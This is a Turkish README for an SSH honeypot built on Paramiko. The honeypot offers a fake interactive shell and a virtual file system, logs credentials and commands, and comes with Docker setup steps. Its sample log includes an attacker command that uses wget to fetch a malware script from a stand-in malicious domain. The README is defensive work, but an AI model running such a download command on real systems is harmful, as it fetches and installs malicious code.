# 🛡️ SSH Honeypot Service (`honeypot_ssh`)

![Python](https://img.shields.io/badge/Python-3.12-blue.svg)
![Paramiko](https://img.shields.io/badge/Library-Paramiko-green.svg)
![Architecture](https://img.shields.io/badge/Architecture-N--Tier-purple.svg)

`honeypot_ssh`, siber saldırganların SSH (Secure Shell) protokolü üzerinden gerçekleştirdiği kaba kuvvet (brute-force) saldırılarını, oturum açma denemelerini ve yetkisiz erişim sonrası çalıştırdıkları komutları güvenli bir şekilde simüle edip kayıt altına alan interaktif bir bal küpü servisidir.

---

## ✨ Öne Çıkan Özellikler

- **Katmanlı Mimari (N-Tier Architecture):** Kod tabanı; yapılandırma (`config`), çekirdek motor (`core`), arayüzler (`interfaces`) ve servisler (`services`) olarak net katmanlara ayrılmıştır.
- **İnteraktif Sahte Kabuk (Fake Shell):** Saldırgan başarılı bir şekilde giriş yaptığını zanneder ve interaktif bir terminal ortamıyla karşılaşır.
- **Sanal Dosya Sistemi (VFS - Virtual File System):** Saldırganın `ls`, `cd`, `cat`, `pwd` gibi temel dizin komutlarını çalıştırarak sistemde geziniyormuş hissiyatı yaşamasını sağlar.
- **Özelleştirilebilir Komut Yanıtları (`commands.json`):** Saldırganların sıkça denediği (`whoami`, `uname -a`, `id` vb.) komutların çıktıları kolayca JSON dosyası üzerinden yapılandırılabilir.
- **Detaylı Saldırı Loglama:** Oturum açma girişimleri, kullanılan kullanıcı adı/şifre kombinasyonları, IP adresleri ve terminalde girilen tüm komutlar anlık olarak loglanır.

---

## 🛠️ Kullanılan Teknolojiler

- **Python 3.12+**: Temel programlama dili.
- **Paramiko**: SSH-2 protokolü sunucusu (Server Interface) oluşturmak ve kriptografik el sıkışmaları yönetmek için kullanılan temel kütüphane.
- **Python-dotenv**: Çevre değişkenlerini (`.env`) ve yapılandırma parametrelerini yükleme motoru.

---

## 🏛️ Katmanlı Mimari Yapısı

```text
honeypot_ssh/
├── config/
│   ├── settings.py          # Sunucu portu, host, RSA anahtar yolları yapılandırması
│   └── commands.json        # Sahte terminal komut çıktı tanımları
├── core/
│   ├── server.py            # Ana SSH dinleyici sunucu sınıfı
│   ├── ssh_handler.py       # Paramiko oturum ve kanal yöneticisi
│   ├── shell.py             # İnteraktif terminal simülatörü
│   └── vfs.py               # Sanal dosya sistemi gezgini
├── interfaces/
│   └── server_interface.py  # Paramiko ServerInterface uygulaması ve kimlik doğrulama
├── services/
│   ├── auth_service.py      # Kimlik doğrulama politikaları ve doğrulama mantığı
│   └── log_service.py       # Dosya ve konsol loglama servisi
├── Dockerfile               # İzole çalıştırma için Docker yapılandırması
├── requirements.txt         # Bağımlılık listesi
└── main.py                  # Uygulama başlatıcısı
```

---

## ⚙️ Kurulum ve Çalıştırma

### 1. Docker ile Çalıştırma (Önerilen)
Kök dizindeki `docker-compose.yml` üzerinden tetiklenir veya tek başına derlenebilir:
```bash
docker build -t honeypot-ssh .
docker run -d -p 2222:2222 -v $(pwd)/honeypot.log:/app/honeypot.log honeypot-ssh
```

### 2. Yerel Ortamda Çalıştırma
```bash
# Bağımlılıkları yükleyin
pip install -r requirements.txt

# Servisi başlatın
python main.py
```
*Not: Standart 22 portunda çalıştırmak için işletim sisteminde root/yönetici yetkisi gerekebilir. Bu nedenle varsayılan olarak yüksek portlarda (ör. 2222) çalışacak şekilde tasarlanmıştır.*

---

## 📊 Log Yapısı (`honeypot.log`)

Servis çalıştığı sürece tüm olayları standart bir formatta kaydeder:
```text
[2026-07-02 20:15:00] [INFO] [AUTH] Login attempt from 192.168.1.50 with username: 'root' and password: '123456'
[2026-07-02 20:15:05] [WARNING] [SHELL] [192.168.1.50] Executed command: wget http://malicious-domain.com/malware.sh
```
